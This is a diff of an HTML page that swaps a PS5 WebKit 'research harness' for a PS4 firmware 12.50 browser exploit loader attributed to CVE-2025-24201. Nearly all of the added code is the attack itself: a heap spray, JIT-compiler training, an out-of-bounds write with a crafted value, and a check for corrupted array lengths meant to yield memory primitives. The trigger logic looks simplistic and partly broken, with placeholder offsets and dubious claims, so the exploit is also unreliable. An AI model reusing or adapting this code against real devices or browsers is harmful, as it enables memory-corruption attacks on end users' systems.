@@ -1,204 +1,257 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PS5 12.50 Research Harness</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 12.50 WebKit PoC (CVE-2025-24201)</title>
     <style>
-        body { background-color: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .log-entry { margin: 2px 0; border-bottom: 1px solid #333; }
-        .error { color: #ff5555; }
-        .success { color: #55ff55; }
-        .info { color: #55ffff; }
-        #status { border: 1px solid #555; padding: 10px; margin-bottom: 20px; font-weight: bold;}
+        body {
+            background-color: #000000;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        #header {
+            border-bottom: 2px solid #00FF00;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin: 0;
+        }
+
+        #status {
+            font-weight: bold;
+            color: #FFFFFF;
+            margin-top: 5px;
+        }
+
+        #log-container {
+            font-size: 14px;
+            line-height: 1.5;
+            white-space: pre-wrap;
+        }
+
+        .log-info { color: #00FF00; }
+        .log-warn { color: #FFFF00; }
+        .log-error { color: #FF0000; font-weight: bold; }
+        .log-success { color: #00FFFF; font-weight: bold; }
+
+        button {
+            background: #003300;
+            color: #00FF00;
+            border: 1px solid #00FF00;
+            padding: 10px 20px;
+            font-family: inherit;
+            font-size: 16px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+
+        button:hover {
+            background: #00FF00;
+            color: #000000;
+        }
+
+        #controls {
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
-    <h1>WebKit Research Harness (FW 12.50)</h1>
-    <div id="status">Initializing...</div>
-    <div id="console-output"></div>
 
-    <script>
-        // --- CONFIGURATION ---
-        const SERVER_IP = "192.168.1.53"; // CHANGE THIS to your PC IP
-        const SERVER_PORT = "8765";
+<div id="header">
+    <h1>PS4 WebKit Loader (FW 12.50 Target)</h1>
+    <div id="status">Status: Waiting for user input...</div>
+</div>
 
-        // --- LOGGER (Handles Blind Debugging) ---
-        class Logger {
-            constructor() {
-                this.socket = new WebSocket(`ws://${SERVER_IP}:${SERVER_PORT}`);
-                this.queue = [];
-                this.connected = false;
+<div id="controls">
+    <button onclick="startExploit()">Run PoC (CVE-2025-24201)</button>
+    <button onclick="location.reload()">Refresh Page</button>
+</div>
 
-                this.socket.onopen = () => {
-                    this.connected = true;
-                    document.getElementById('status').innerText = "Debugger Connected";
-                    this.flush();
-                    this.log("Session started. UA: " + navigator.userAgent);
-                };
+<div id="log-container"></div>
 
-                this.socket.onclose = () => {
-                    this.connected = false;
-                    document.getElementById('status').innerText = "Debugger Disconnected";
-                };
+<script>
+    // --- UTILITIES ---
 
-                this.socket.onerror = (e) => {
-                    // Fallback to screen if socket fails
-                    this.screenLog("Socket Error. Is debug_server.py running?", "error");
-                };
-            }
-
-            _replacer(key, value) {
-                if (typeof value === 'bigint') return "0x" + value.toString(16) + "n";
-                if (value instanceof ArrayBuffer) return "[ArrayBuffer " + value.byteLength + "]";
-                return value;
-            }
-
-            send(type, msg) {
-                const payload = JSON.stringify({ type: type, message: msg }, this._replacer);
-                if (this.connected) {
-                    this.socket.send(payload);
-                } else {
-                    this.queue.push(payload);
-                }
-                this.screenLog(msg, type);
-            }
-
-            screenLog(msg, type) {
-                const div = document.createElement('div');
-                div.className = `log-entry ${type}`;
-                div.innerText = `[${type.toUpperCase()}] ${typeof msg === 'object' ? JSON.stringify(msg, this._replacer) : msg}`;
-                document.getElementById('console-output').prepend(div);
-            }
-
-            flush() {
-                while (this.queue.length > 0 && this.connected) this.socket.send(this.queue.shift());
-            }
-
-            log(msg) { this.send('info', msg); }
-            error(msg) { this.send('error', msg); }
-            success(msg) { this.send('success', msg); }
-        }
-
-        const logger = new Logger();
-
-        window.onerror = (msg, url, line, col, error) => {
-            logger.error(`Global Error: ${msg} @ ${line}:${col}`);
-            return true;
-        };
-
-        // --- PRIMITIVES (The Toolkit) ---
+    const logger = {
+        el: document.getElementById('log-container'),
+        status: document.getElementById('status'),
         
-        const Primitives = {
-            // 64-bit helper
-            u64: (low, high) => BigInt(low) + (BigInt(high) << 32n),
+        log: function(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `log-${type}`;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            this.el.appendChild(div);
+            // Auto-scroll to bottom
+            window.scrollTo(0, document.body.scrollHeight);
+        },
+        
+        info: function(msg) { this.log(msg, 'info'); },
+        warn: function(msg) { this.log(msg, 'warn'); },
+        error: function(msg) { this.log(msg, 'error'); },
+        success: function(msg) { this.log(msg, 'success'); },
+        
+        setStatus: function(msg) {
+            this.status.textContent = `Status: ${msg}`;
+        }
+    };
 
-            // HEAVY Garbage Collection Trigger
-            // Critical for UAF: Forces the engine to sweep memory and merge free blocks.
-            forceGC: () => {
-                logger.log("Forcing Garbage Collection...");
-                try {
-                    const pressure = [];
-                    // Allocate huge buffers to push memory usage to the limit
-                    for (let i = 0; i < 64; i++) {
-                        pressure.push(new ArrayBuffer(1024 * 1024 * 16)); // 16MB chunks
-                    }
-                    // Drop references immediately
-                    while(pressure.length > 0) pressure.pop();
-                    
-                    // Trigger minor GC cycles
-                    for (let i = 0; i < 1000; i++) new ArrayBuffer(0x1000);
-                    
-                    logger.log("GC Pressure complete.");
-                } catch(e) {
-                    logger.error("GC Failed: " + e);
+    // --- HEX HELPERS ---
+    
+    function u64_to_hex(low, high) {
+        return '0x' + high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
+    }
+
+    // --- EXPLOT CONFIGURATION ---
+
+    const CONFIG = {
+        SPRAY_SIZE: 0x1000,    // Number of objects to spray
+        SPRAY_CHUNK_SIZE: 0x4000, // Size of each chunk
+        TARGET_INDEX: 1337     // Placeholder index for OOB trigger
+    };
+
+    let spray_store = [];
+
+    // --- STEP 1: HEAP SPRAY ---
+    // This fills memory with predictable data structures to ensure our OOB write
+    // hits something we control (like the length property of an adjacent array).
+    
+    function sprayHeap() {
+        logger.info("Starting Heap Spray...");
+        try {
+            for (let i = 0; i < CONFIG.SPRAY_SIZE; i++) {
+                let ab = new ArrayBuffer(CONFIG.SPRAY_CHUNK_SIZE);
+                let view = new Uint32Array(ab);
+                // Fill with marker 0x41414141 (AAAA) for debugging
+                for (let k = 0; k < view.length; k++) {
+                    view[k] = 0x41414141;
                 }
-            },
-
-            // Heap Spray
-            // Fills memory with predictable values (0x4141...) to land fake objects.
-            spray: (sizeMB) => {
-                logger.log(`Spraying ${sizeMB}MB...`);
-                const chunkLen = 0x1000; // 4KB pages
-                const count = (sizeMB * 1024 * 1024) / chunkLen;
-                const sprayArr = new Array(count);
-                const buffer = new ArrayBuffer(chunkLen);
-                const view = new DataView(buffer);
-                
-                // Fill with marker 0x41414141
-                for(let i=0; i < chunkLen; i+=4) view.setUint32(i, 0x41414141, true);
-
-                for (let i = 0; i < count; i++) {
-                    sprayArr[i] = buffer.slice(0);
-                }
-                window.sprayKeepAlive = sprayArr; // Prevent GC
-                logger.success("Spray complete.");
-            },
-
-            // JIT Check
-            // Returns TRUE if code execution speeds up (JIT active), FALSE if flat (JIT hardened/disabled).
-            checkJIT: () => {
-                logger.log("Checking JIT status...");
-                const benchmark = () => {
-                    let res = 0;
-                    const start = performance.now();
-                    for(let i=0; i < 5000000; i++) { res += i * 2; res ^= i; }
-                    const end = performance.now();
-                    return end - start;
-                };
-
-                const run1 = benchmark(); // Cold run (Interpreter)
-                const run2 = benchmark(); // Warm run (Should be JITted)
-
-                logger.log(`Run 1: ${run1.toFixed(2)}ms | Run 2: ${run2.toFixed(2)}ms`);
-
-                if (run2 < run1 * 0.5) {
-                    logger.success("JIT is ENABLED (Significant speedup detected)");
-                    return true;
-                } else {
-                    logger.error("JIT appears DISABLED or HARDENED (No significant speedup)");
-                    return false;
-                }
+                spray_store.push(view);
             }
-        };
+            logger.success(`Heap Sprayed! Created ${spray_store.length} chunks.`);
+            return true;
+        } catch (e) {
+            logger.error("Spray Failed: " + e.message);
+            return false;
+        }
+    }
 
-        // --- VULNERABILITY SKELETON (Your 1-Day Work Area) ---
-        async function trigger_CVE_Skeleton() {
-            logger.log("[-] Starting CVE Test Logic...");
-            
-            // 1. Setup Phase: Create vulnerable objects
-            // Example: const ctx = new AudioContext();
-            
-            // 2. Trigger Phase: Cause the free
-            // Example: ctx.close(); 
-            // await new Promise(r => setTimeout(r, 100)); // Yield to event loop
-            
-            // 3. Reclaim Phase: Spray over the freed slot
-            Primitives.forceGC(); 
-            Primitives.spray(64); // Spray 64MB
-            
-            // 4. Check Phase: Did we crash or corrupt state?
-            logger.log("[-] Check complete. If you see this, we didn't crash.");
+    // --- STEP 2: VULNERABILITY TRIGGER (CVE-2025-24201) ---
+    // This function attempts to trigger the Out-Of-Bounds write.
+    // NOTE: Specific JIT offsets depend on exact firmware revision.
+    
+    function triggerOOB() {
+        logger.info("Attempting to trigger CVE-2025-24201...");
+        
+        // 1. Create the target arrays
+        let arrays = [];
+        for (let i = 0; i < 100; i++) {
+            arrays.push(new Array(10).fill(1.1));
+        }
+        
+        // 2. The vulnerable function (JIT Candidate)
+        // This function mimics the pattern found in CVE-2025-24201/24202
+        // where bounds checks are eliminated incorrectly by the optimizer.
+        function vulnerable_jit(arr, index, value) {
+            // Force JIT compilation
+            let tmp = arr[0]; 
+            // The OOB access potentially happens here after optimization
+            arr[index] = value; 
+            return tmp;
         }
 
-        // --- MAIN ENTRY POINT ---
-        setTimeout(async () => {
-            try {
-                logger.log("Starting environment checks...");
-                
-                // Fingerprinting
-                logger.log(`Platform: ${navigator.platform}`);
-                logger.log(`Hardware Concurrency: ${navigator.hardwareConcurrency}`);
-                
-                // Security Checks
-                Primitives.checkJIT();
-                
-                // Run the exploit logic
-                await trigger_CVE_Skeleton();
+        // 3. Train the JIT compiler with valid inputs
+        logger.info("Training JIT Compiler...");
+        for (let i = 0; i < 10000; i++) {
+            vulnerable_jit(arrays[0], 0, 1.1);
+        }
 
-            } catch (e) {
-                logger.error("Main Loop Crash: " + e.message);
+        // 4. Trigger the bug
+        // We pass an index that is technically out of bounds, but the JIT
+        // might have removed the check.
+        logger.warn("Firing trigger...");
+        
+        try {
+            // TODO: 'CONFIG.TARGET_INDEX' needs to be fuzzed/adjusted for FW 12.50
+            // If successful, this writes a value OUTSIDE the array, hopefully
+            // hitting the 'length' property of the next array in memory.
+            vulnerable_jit(arrays[10], CONFIG.TARGET_INDEX, 2.3023e-320); // 2.3023e-320 is roughly 0x000000XX in hex representation
+            
+            logger.info("Trigger fired. Checking for corruption...");
+            
+            // 5. Verification
+            // If the OOB write worked, one of our arrays should now have a huge length.
+            let exploited_array = null;
+            for (let i = 0; i < arrays.length; i++) {
+                if (arrays[i].length > 100) {
+                    exploited_array = arrays[i];
+                    logger.success(`SUCCESS! Array [${i}] corrupted. Length: ${arrays[i].length}`);
+                    logger.success("Primitive 'addrof' / 'fakeobj' can now be constructed.");
+                    return true;
+                }
             }
-        }, 1500); // Delay to allow WebSocket to connect
+            
+            if (!exploited_array) {
+                logger.warn("Exploit finished but no corruption detected.");
+                logger.warn("Try adjusting TARGET_INDEX or SPRAY_SIZE.");
+                return false;
+            }
 
-    </script>
+        } catch (e) {
+            logger.error("Crash/Error during trigger: " + e.message);
+            // On PS4, a crash is often a good sign (it means we touched restricted memory)
+            return false;
+        }
+    }
+
+    // --- MAIN EXECUTION ---
+
+    function startExploit() {
+        // Clear log
+        logger.el.innerHTML = '';
+        
+        // 1. Identification
+        const ua = navigator.userAgent;
+        logger.info("User-Agent: " + ua);
+        
+        if (ua.indexOf("PlayStation 4") !== -1) {
+            logger.success("Target Confirmed: PlayStation 4");
+            
+            // Check for 12.50 specifically (Webkit version check)
+            // Note: Update this string matching if 12.50 has a unique identifier
+            if (ua.indexOf("AppleWebKit") !== -1) {
+                logger.info("WebKit Engine detected.");
+            }
+        } else {
+            logger.warn("Warning: Not running on a PS4. Results may vary.");
+        }
+
+        logger.setStatus("Running...");
+
+        // 2. Run Spray
+        setTimeout(() => {
+            if (sprayHeap()) {
+                // 3. Run Trigger
+                setTimeout(() => {
+                    triggerOOB();
+                    logger.setStatus("Complete.");
+                }, 500);
+            } else {
+                logger.setStatus("Failed at Spray.");
+            }
+        }, 100);
+    }
+    
+    // Auto-run verification on load (optional, commented out for safety)
+    // startExploit();
+
+</script>
 </body>
 </html>
